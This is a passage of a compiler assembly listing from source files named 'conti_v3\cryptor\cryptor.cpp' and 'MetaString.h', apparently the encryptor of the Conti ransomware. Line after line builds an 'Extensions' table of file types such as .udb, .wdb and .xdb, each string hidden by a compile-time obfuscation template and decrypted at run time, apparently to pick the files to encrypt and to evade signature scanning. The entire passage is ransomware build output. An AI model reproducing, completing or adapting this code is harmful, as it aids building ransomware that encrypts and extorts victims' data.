  03933	c6 85 01 06 00
	00 03		 mov	 BYTE PTR $T141[rbp-255], 3
  0393a	c6 85 02 06 00
	00 45		 mov	 BYTE PTR $T141[rbp-254], 69 ; 00000045H
  03941	c6 85 03 06 00
	00 0d		 mov	 BYTE PTR $T141[rbp-253], 13
  03948	c6 85 04 06 00
	00 45		 mov	 BYTE PTR $T141[rbp-252], 69 ; 00000045H
  0394f	c6 85 05 06 00
	00 55		 mov	 BYTE PTR $T141[rbp-251], 85 ; 00000055H
  03956	c6 85 06 06 00
	00 45		 mov	 BYTE PTR $T141[rbp-250], 69 ; 00000045H
  0395d	c6 85 07 06 00
	00 1f		 mov	 BYTE PTR $T141[rbp-249], 31
  03964	c6 85 08 06 00
	00 45		 mov	 BYTE PTR $T141[rbp-248], 69 ; 00000045H
  0396b	c6 85 09 06 00
	00 45		 mov	 BYTE PTR $T141[rbp-247], 69 ; 00000045H
  03972	c6 85 0a 06 00
	00 45		 mov	 BYTE PTR $T141[rbp-246], 69 ; 00000045H
  03979	0f b6 85 01 06
	00 00		 movzx	 eax, BYTE PTR $T141[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 434  : 		OBFW(L".tps"),

  03980	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03985	48 89 85 90 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+864], rax

; 435  : 		OBFW(L".trc"),

  0398c	48 8d 8d 10 06
	00 00		 lea	 rcx, QWORD PTR $T142[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03993	c6 85 10 06 00
	00 00		 mov	 BYTE PTR $T142[rbp-256], 0
  0399a	c6 85 11 06 00
	00 21		 mov	 BYTE PTR $T142[rbp-255], 33 ; 00000021H
  039a1	c6 85 12 06 00
	00 40		 mov	 BYTE PTR $T142[rbp-254], 64 ; 00000040H
  039a8	c6 85 13 06 00
	00 1e		 mov	 BYTE PTR $T142[rbp-253], 30
  039af	c6 85 14 06 00
	00 40		 mov	 BYTE PTR $T142[rbp-252], 64 ; 00000040H
  039b6	c6 85 15 06 00
	00 46		 mov	 BYTE PTR $T142[rbp-251], 70 ; 00000046H
  039bd	c6 85 16 06 00
	00 40		 mov	 BYTE PTR $T142[rbp-250], 64 ; 00000040H
  039c4	c6 85 17 06 00
	00 74		 mov	 BYTE PTR $T142[rbp-249], 116 ; 00000074H
  039cb	c6 85 18 06 00
	00 40		 mov	 BYTE PTR $T142[rbp-248], 64 ; 00000040H
  039d2	c6 85 19 06 00
	00 40		 mov	 BYTE PTR $T142[rbp-247], 64 ; 00000040H
  039d9	c6 85 1a 06 00
	00 40		 mov	 BYTE PTR $T142[rbp-246], 64 ; 00000040H
  039e0	0f b6 85 11 06
	00 00		 movzx	 eax, BYTE PTR $T142[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 435  : 		OBFW(L".trc"),

  039e7	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  039ec	48 89 85 98 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+872], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  039f3	c6 85 20 06 00
	00 00		 mov	 BYTE PTR $T143[rbp-256], 0
  039fa	c6 85 21 06 00
	00 14		 mov	 BYTE PTR $T143[rbp-255], 20
  03a01	c6 85 22 06 00
	00 03		 mov	 BYTE PTR $T143[rbp-254], 3

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  03a08	c6 85 23 06 00
	00 4f		 mov	 BYTE PTR $T143[rbp-253], 79 ; 0000004fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 436  : 		OBFW(L".trm"),

  03a0f	48 8d 8d 20 06
	00 00		 lea	 rcx, QWORD PTR $T143[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  03a16	c6 85 24 06 00
	00 03		 mov	 BYTE PTR $T143[rbp-252], 3
  03a1d	c6 85 25 06 00
	00 0c		 mov	 BYTE PTR $T143[rbp-251], 12
  03a24	c6 85 26 06 00
	00 03		 mov	 BYTE PTR $T143[rbp-250], 3
  03a2b	c6 85 27 06 00
	00 23		 mov	 BYTE PTR $T143[rbp-249], 35 ; 00000023H
  03a32	c6 85 28 06 00
	00 03		 mov	 BYTE PTR $T143[rbp-248], 3
  03a39	c6 85 29 06 00
	00 03		 mov	 BYTE PTR $T143[rbp-247], 3
  03a40	c6 85 2a 06 00
	00 03		 mov	 BYTE PTR $T143[rbp-246], 3
  03a47	0f b6 85 21 06
	00 00		 movzx	 eax, BYTE PTR $T143[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 436  : 		OBFW(L".trm"),

  03a4e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03a53	48 89 85 a0 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+880], rax

; 437  : 		OBFW(L".udb"),

  03a5a	48 8d 8d 30 06
	00 00		 lea	 rcx, QWORD PTR $T144[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03a61	c6 85 30 06 00
	00 00		 mov	 BYTE PTR $T144[rbp-256], 0
  03a68	c6 85 31 06 00
	00 00		 mov	 BYTE PTR $T144[rbp-255], 0
  03a6f	c6 85 32 06 00
	00 36		 mov	 BYTE PTR $T144[rbp-254], 54 ; 00000036H
  03a76	c6 85 33 06 00
	00 05		 mov	 BYTE PTR $T144[rbp-253], 5
  03a7d	c6 85 34 06 00
	00 36		 mov	 BYTE PTR $T144[rbp-252], 54 ; 00000036H
  03a84	c6 85 35 06 00
	00 24		 mov	 BYTE PTR $T144[rbp-251], 36 ; 00000024H
  03a8b	c6 85 36 06 00
	00 36		 mov	 BYTE PTR $T144[rbp-250], 54 ; 00000036H
  03a92	c6 85 37 06 00
	00 4d		 mov	 BYTE PTR $T144[rbp-249], 77 ; 0000004dH
  03a99	c6 85 38 06 00
	00 36		 mov	 BYTE PTR $T144[rbp-248], 54 ; 00000036H
  03aa0	c6 85 39 06 00
	00 36		 mov	 BYTE PTR $T144[rbp-247], 54 ; 00000036H
  03aa7	c6 85 3a 06 00
	00 36		 mov	 BYTE PTR $T144[rbp-246], 54 ; 00000036H
  03aae	0f b6 85 31 06
	00 00		 movzx	 eax, BYTE PTR $T144[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 437  : 		OBFW(L".udb"),

  03ab5	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03aba	48 89 85 a8 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+888], rax

; 438  : 		OBFW(L".udl"),

  03ac1	48 8d 8d 40 06
	00 00		 lea	 rcx, QWORD PTR $T145[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03ac8	c6 85 40 06 00
	00 00		 mov	 BYTE PTR $T145[rbp-256], 0
  03acf	c6 85 41 06 00
	00 63		 mov	 BYTE PTR $T145[rbp-255], 99 ; 00000063H
  03ad6	c6 85 42 06 00
	00 07		 mov	 BYTE PTR $T145[rbp-254], 7
  03add	c6 85 43 06 00
	00 72		 mov	 BYTE PTR $T145[rbp-253], 114 ; 00000072H
  03ae4	c6 85 44 06 00
	00 07		 mov	 BYTE PTR $T145[rbp-252], 7
  03aeb	c6 85 45 06 00
	00 50		 mov	 BYTE PTR $T145[rbp-251], 80 ; 00000050H
  03af2	c6 85 46 06 00
	00 07		 mov	 BYTE PTR $T145[rbp-250], 7
  03af9	c6 85 47 06 00
	00 60		 mov	 BYTE PTR $T145[rbp-249], 96 ; 00000060H
  03b00	c6 85 48 06 00
	00 07		 mov	 BYTE PTR $T145[rbp-248], 7
  03b07	c6 85 49 06 00
	00 07		 mov	 BYTE PTR $T145[rbp-247], 7
  03b0e	c6 85 4a 06 00
	00 07		 mov	 BYTE PTR $T145[rbp-246], 7
  03b15	0f b6 85 41 06
	00 00		 movzx	 eax, BYTE PTR $T145[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 438  : 		OBFW(L".udl"),

  03b1c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03b21	48 89 85 b0 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+896], rax

; 439  : 		OBFW(L".usr"),

  03b28	48 8d 8d 50 06
	00 00		 lea	 rcx, QWORD PTR $T146[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03b2f	c6 85 50 06 00
	00 00		 mov	 BYTE PTR $T146[rbp-256], 0
  03b36	c6 85 51 06 00
	00 5e		 mov	 BYTE PTR $T146[rbp-255], 94 ; 0000005eH
  03b3d	c6 85 52 06 00
	00 1e		 mov	 BYTE PTR $T146[rbp-254], 30
  03b44	c6 85 53 06 00
	00 79		 mov	 BYTE PTR $T146[rbp-253], 121 ; 00000079H
  03b4b	c6 85 54 06 00
	00 1e		 mov	 BYTE PTR $T146[rbp-252], 30
  03b52	c6 85 55 06 00
	00 3f		 mov	 BYTE PTR $T146[rbp-251], 63 ; 0000003fH
  03b59	c6 85 56 06 00
	00 1e		 mov	 BYTE PTR $T146[rbp-250], 30
  03b60	c6 85 57 06 00
	00 22		 mov	 BYTE PTR $T146[rbp-249], 34 ; 00000022H
  03b67	c6 85 58 06 00
	00 1e		 mov	 BYTE PTR $T146[rbp-248], 30
  03b6e	c6 85 59 06 00
	00 1e		 mov	 BYTE PTR $T146[rbp-247], 30
  03b75	c6 85 5a 06 00
	00 1e		 mov	 BYTE PTR $T146[rbp-246], 30
  03b7c	0f b6 85 51 06
	00 00		 movzx	 eax, BYTE PTR $T146[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 439  : 		OBFW(L".usr"),

  03b83	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03b88	48 89 85 b8 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+904], rax

; 440  : 		OBFW(L".v12"),

  03b8f	48 8d 8d 60 06
	00 00		 lea	 rcx, QWORD PTR $T147[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03b96	c6 85 60 06 00
	00 00		 mov	 BYTE PTR $T147[rbp-256], 0
  03b9d	c6 85 61 06 00
	00 56		 mov	 BYTE PTR $T147[rbp-255], 86 ; 00000056H
  03ba4	c6 85 62 06 00
	00 27		 mov	 BYTE PTR $T147[rbp-254], 39 ; 00000027H
  03bab	c6 85 63 06 00
	00 10		 mov	 BYTE PTR $T147[rbp-253], 16
  03bb2	c6 85 64 06 00
	00 27		 mov	 BYTE PTR $T147[rbp-252], 39 ; 00000027H
  03bb9	c6 85 65 06 00
	00 09		 mov	 BYTE PTR $T147[rbp-251], 9
  03bc0	c6 85 66 06 00
	00 27		 mov	 BYTE PTR $T147[rbp-250], 39 ; 00000027H
  03bc7	c6 85 67 06 00
	00 44		 mov	 BYTE PTR $T147[rbp-249], 68 ; 00000044H
  03bce	c6 85 68 06 00
	00 27		 mov	 BYTE PTR $T147[rbp-248], 39 ; 00000027H
  03bd5	c6 85 69 06 00
	00 27		 mov	 BYTE PTR $T147[rbp-247], 39 ; 00000027H
  03bdc	c6 85 6a 06 00
	00 27		 mov	 BYTE PTR $T147[rbp-246], 39 ; 00000027H
  03be3	0f b6 85 61 06
	00 00		 movzx	 eax, BYTE PTR $T147[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 440  : 		OBFW(L".v12"),

  03bea	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DL@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<59,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03bef	48 89 85 c0 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+912], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03bf6	c6 85 70 06 00
	00 00		 mov	 BYTE PTR $T148[rbp-256], 0
  03bfd	c6 85 71 06 00
	00 65		 mov	 BYTE PTR $T148[rbp-255], 101 ; 00000065H
  03c04	c6 85 72 06 00
	00 4c		 mov	 BYTE PTR $T148[rbp-254], 76 ; 0000004cH
  03c0b	c6 85 73 06 00
	00 6b		 mov	 BYTE PTR $T148[rbp-253], 107 ; 0000006bH
  03c12	c6 85 74 06 00
	00 4c		 mov	 BYTE PTR $T148[rbp-252], 76 ; 0000004cH
  03c19	c6 85 75 06 00
	00 35		 mov	 BYTE PTR $T148[rbp-251], 53 ; 00000035H
  03c20	c6 85 76 06 00
	00 4c		 mov	 BYTE PTR $T148[rbp-250], 76 ; 0000004cH
  03c27	c6 85 77 06 00
	00 4b		 mov	 BYTE PTR $T148[rbp-249], 75 ; 0000004bH
  03c2e	c6 85 78 06 00
	00 4c		 mov	 BYTE PTR $T148[rbp-248], 76 ; 0000004cH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  03c35	c6 85 79 06 00
	00 4c		 mov	 BYTE PTR $T148[rbp-247], 76 ; 0000004cH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 441  : 		OBFW(L".vis"),

  03c3c	48 8d 8d 70 06
	00 00		 lea	 rcx, QWORD PTR $T148[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  03c43	c6 85 7a 06 00
	00 4c		 mov	 BYTE PTR $T148[rbp-246], 76 ; 0000004cH
  03c4a	0f b6 85 71 06
	00 00		 movzx	 eax, BYTE PTR $T148[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 441  : 		OBFW(L".vis"),

  03c51	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<53,76,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03c56	48 89 85 c8 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+920], rax

; 442  : 		OBFW(L".vpd"),

  03c5d	48 8d 8d 80 06
	00 00		 lea	 rcx, QWORD PTR $T149[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03c64	c6 85 80 06 00
	00 00		 mov	 BYTE PTR $T149[rbp-256], 0
  03c6b	c6 85 81 06 00
	00 26		 mov	 BYTE PTR $T149[rbp-255], 38 ; 00000026H
  03c72	c6 85 82 06 00
	00 39		 mov	 BYTE PTR $T149[rbp-254], 57 ; 00000039H
  03c79	c6 85 83 06 00
	00 45		 mov	 BYTE PTR $T149[rbp-253], 69 ; 00000045H
  03c80	c6 85 84 06 00
	00 39		 mov	 BYTE PTR $T149[rbp-252], 57 ; 00000039H
  03c87	c6 85 85 06 00
	00 4d		 mov	 BYTE PTR $T149[rbp-251], 77 ; 0000004dH
  03c8e	c6 85 86 06 00
	00 39		 mov	 BYTE PTR $T149[rbp-250], 57 ; 00000039H
  03c95	c6 85 87 06 00
	00 5d		 mov	 BYTE PTR $T149[rbp-249], 93 ; 0000005dH
  03c9c	c6 85 88 06 00
	00 39		 mov	 BYTE PTR $T149[rbp-248], 57 ; 00000039H
  03ca3	c6 85 89 06 00
	00 39		 mov	 BYTE PTR $T149[rbp-247], 57 ; 00000039H
  03caa	c6 85 8a 06 00
	00 39		 mov	 BYTE PTR $T149[rbp-246], 57 ; 00000039H
  03cb1	0f b6 85 81 06
	00 00		 movzx	 eax, BYTE PTR $T149[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 442  : 		OBFW(L".vpd"),

  03cb8	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03cbd	48 89 85 d0 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+928], rax

; 443  : 		OBFW(L".vvv"),

  03cc4	48 8d 8d 90 06
	00 00		 lea	 rcx, QWORD PTR $T150[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03ccb	c6 85 90 06 00
	00 00		 mov	 BYTE PTR $T150[rbp-256], 0
  03cd2	c6 85 91 06 00
	00 23		 mov	 BYTE PTR $T150[rbp-255], 35 ; 00000023H
  03cd9	c6 85 92 06 00
	00 18		 mov	 BYTE PTR $T150[rbp-254], 24
  03ce0	c6 85 93 06 00
	00 7c		 mov	 BYTE PTR $T150[rbp-253], 124 ; 0000007cH
  03ce7	c6 85 94 06 00
	00 18		 mov	 BYTE PTR $T150[rbp-252], 24
  03cee	c6 85 95 06 00
	00 7c		 mov	 BYTE PTR $T150[rbp-251], 124 ; 0000007cH
  03cf5	c6 85 96 06 00
	00 18		 mov	 BYTE PTR $T150[rbp-250], 24
  03cfc	c6 85 97 06 00
	00 7c		 mov	 BYTE PTR $T150[rbp-249], 124 ; 0000007cH
  03d03	c6 85 98 06 00
	00 18		 mov	 BYTE PTR $T150[rbp-248], 24
  03d0a	c6 85 99 06 00
	00 18		 mov	 BYTE PTR $T150[rbp-247], 24
  03d11	c6 85 9a 06 00
	00 18		 mov	 BYTE PTR $T150[rbp-246], 24
  03d18	0f b6 85 91 06
	00 00		 movzx	 eax, BYTE PTR $T150[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 443  : 		OBFW(L".vvv"),

  03d1f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03d24	48 89 85 d8 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+936], rax

; 444  : 		OBFW(L".wdb"),

  03d2b	48 8d 8d a0 06
	00 00		 lea	 rcx, QWORD PTR $T151[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03d32	c6 85 a0 06 00
	00 00		 mov	 BYTE PTR $T151[rbp-256], 0
  03d39	c6 85 a1 06 00
	00 35		 mov	 BYTE PTR $T151[rbp-255], 53 ; 00000035H
  03d40	c6 85 a2 06 00
	00 13		 mov	 BYTE PTR $T151[rbp-254], 19
  03d47	c6 85 a3 06 00
	00 76		 mov	 BYTE PTR $T151[rbp-253], 118 ; 00000076H
  03d4e	c6 85 a4 06 00
	00 13		 mov	 BYTE PTR $T151[rbp-252], 19
  03d55	c6 85 a5 06 00
	00 73		 mov	 BYTE PTR $T151[rbp-251], 115 ; 00000073H
  03d5c	c6 85 a6 06 00
	00 13		 mov	 BYTE PTR $T151[rbp-250], 19
  03d63	c6 85 a7 06 00
	00 6c		 mov	 BYTE PTR $T151[rbp-249], 108 ; 0000006cH
  03d6a	c6 85 a8 06 00
	00 13		 mov	 BYTE PTR $T151[rbp-248], 19
  03d71	c6 85 a9 06 00
	00 13		 mov	 BYTE PTR $T151[rbp-247], 19
  03d78	c6 85 aa 06 00
	00 13		 mov	 BYTE PTR $T151[rbp-246], 19
  03d7f	0f b6 85 a1 06
	00 00		 movzx	 eax, BYTE PTR $T151[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 444  : 		OBFW(L".wdb"),

  03d86	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03d8b	48 89 85 e0 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+944], rax

; 445  : 		OBFW(L".wmdb"),

  03d92	48 8d 8d 50 08
	00 00		 lea	 rcx, QWORD PTR $T152[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03d99	c6 85 50 08 00
	00 00		 mov	 BYTE PTR $T152[rbp-256], 0
  03da0	c6 85 51 08 00
	00 35		 mov	 BYTE PTR $T152[rbp-255], 53 ; 00000035H
  03da7	c6 85 52 08 00
	00 54		 mov	 BYTE PTR $T152[rbp-254], 84 ; 00000054H
  03dae	c6 85 53 08 00
	00 75		 mov	 BYTE PTR $T152[rbp-253], 117 ; 00000075H
  03db5	c6 85 54 08 00
	00 54		 mov	 BYTE PTR $T152[rbp-252], 84 ; 00000054H
  03dbc	c6 85 55 08 00
	00 3f		 mov	 BYTE PTR $T152[rbp-251], 63 ; 0000003fH
  03dc3	c6 85 56 08 00
	00 54		 mov	 BYTE PTR $T152[rbp-250], 84 ; 00000054H
  03dca	c6 85 57 08 00
	00 74		 mov	 BYTE PTR $T152[rbp-249], 116 ; 00000074H
  03dd1	c6 85 58 08 00
	00 54		 mov	 BYTE PTR $T152[rbp-248], 84 ; 00000054H
  03dd8	c6 85 59 08 00
	00 1d		 mov	 BYTE PTR $T152[rbp-247], 29
  03ddf	c6 85 5a 08 00
	00 54		 mov	 BYTE PTR $T152[rbp-246], 84 ; 00000054H
  03de6	c6 85 5b 08 00
	00 54		 mov	 BYTE PTR $T152[rbp-245], 84 ; 00000054H
  03ded	c6 85 5c 08 00
	00 54		 mov	 BYTE PTR $T152[rbp-244], 84 ; 00000054H
  03df4	0f b6 85 51 08
	00 00		 movzx	 eax, BYTE PTR $T152[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 445  : 		OBFW(L".wmdb"),

  03dfb	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  03e00	48 89 85 e8 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+952], rax

; 446  : 		OBFW(L".wrk"),

  03e07	48 8d 8d b0 06
	00 00		 lea	 rcx, QWORD PTR $T153[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03e0e	c6 85 b0 06 00
	00 00		 mov	 BYTE PTR $T153[rbp-256], 0
  03e15	c6 85 b1 06 00
	00 07		 mov	 BYTE PTR $T153[rbp-255], 7
  03e1c	c6 85 b2 06 00
	00 09		 mov	 BYTE PTR $T153[rbp-254], 9
  03e23	c6 85 b3 06 00
	00 30		 mov	 BYTE PTR $T153[rbp-253], 48 ; 00000030H
  03e2a	c6 85 b4 06 00
	00 09		 mov	 BYTE PTR $T153[rbp-252], 9
  03e31	c6 85 b5 06 00
	00 78		 mov	 BYTE PTR $T153[rbp-251], 120 ; 00000078H
  03e38	c6 85 b6 06 00
	00 09		 mov	 BYTE PTR $T153[rbp-250], 9
  03e3f	c6 85 b7 06 00
	00 2b		 mov	 BYTE PTR $T153[rbp-249], 43 ; 0000002bH
  03e46	c6 85 b8 06 00
	00 09		 mov	 BYTE PTR $T153[rbp-248], 9
  03e4d	c6 85 b9 06 00
	00 09		 mov	 BYTE PTR $T153[rbp-247], 9
  03e54	c6 85 ba 06 00
	00 09		 mov	 BYTE PTR $T153[rbp-246], 9
  03e5b	0f b6 85 b1 06
	00 00		 movzx	 eax, BYTE PTR $T153[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 446  : 		OBFW(L".wrk"),

  03e62	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03e67	48 89 85 f0 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+960], rax

; 447  : 		OBFW(L".xdb"),

  03e6e	48 8d 8d c0 06
	00 00		 lea	 rcx, QWORD PTR $T154[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03e75	c6 85 c0 06 00
	00 00		 mov	 BYTE PTR $T154[rbp-256], 0
  03e7c	c6 85 c1 06 00
	00 1d		 mov	 BYTE PTR $T154[rbp-255], 29
  03e83	c6 85 c2 06 00
	00 58		 mov	 BYTE PTR $T154[rbp-254], 88 ; 00000058H
  03e8a	c6 85 c3 06 00
	00 27		 mov	 BYTE PTR $T154[rbp-253], 39 ; 00000027H
  03e91	c6 85 c4 06 00
	00 58		 mov	 BYTE PTR $T154[rbp-252], 88 ; 00000058H
  03e98	c6 85 c5 06 00
	00 1a		 mov	 BYTE PTR $T154[rbp-251], 26
  03e9f	c6 85 c6 06 00
	00 58		 mov	 BYTE PTR $T154[rbp-250], 88 ; 00000058H
  03ea6	c6 85 c7 06 00
	00 0c		 mov	 BYTE PTR $T154[rbp-249], 12
  03ead	c6 85 c8 06 00
	00 58		 mov	 BYTE PTR $T154[rbp-248], 88 ; 00000058H
  03eb4	c6 85 c9 06 00
	00 58		 mov	 BYTE PTR $T154[rbp-247], 88 ; 00000058H
  03ebb	c6 85 ca 06 00
	00 58		 mov	 BYTE PTR $T154[rbp-246], 88 ; 00000058H
  03ec2	0f b6 85 c1 06
	00 00		 movzx	 eax, BYTE PTR $T154[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 447  : 		OBFW(L".xdb"),

  03ec9	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03ece	48 89 85 f8 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+968], rax

; 448  : 		OBFW(L".xld"),

  03ed5	48 8d 8d d0 06
	00 00		 lea	 rcx, QWORD PTR $T155[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03edc	c6 85 d0 06 00
	00 00		 mov	 BYTE PTR $T155[rbp-256], 0
  03ee3	c6 85 d1 06 00
	00 4c		 mov	 BYTE PTR $T155[rbp-255], 76 ; 0000004cH
  03eea	c6 85 d2 06 00
	00 6f		 mov	 BYTE PTR $T155[rbp-254], 111 ; 0000006fH
  03ef1	c6 85 d3 06 00
	00 61		 mov	 BYTE PTR $T155[rbp-253], 97 ; 00000061H
  03ef8	c6 85 d4 06 00
	00 6f		 mov	 BYTE PTR $T155[rbp-252], 111 ; 0000006fH
  03eff	c6 85 d5 06 00
	00 49		 mov	 BYTE PTR $T155[rbp-251], 73 ; 00000049H
  03f06	c6 85 d6 06 00
	00 6f		 mov	 BYTE PTR $T155[rbp-250], 111 ; 0000006fH
  03f0d	c6 85 d7 06 00
	00 39		 mov	 BYTE PTR $T155[rbp-249], 57 ; 00000039H
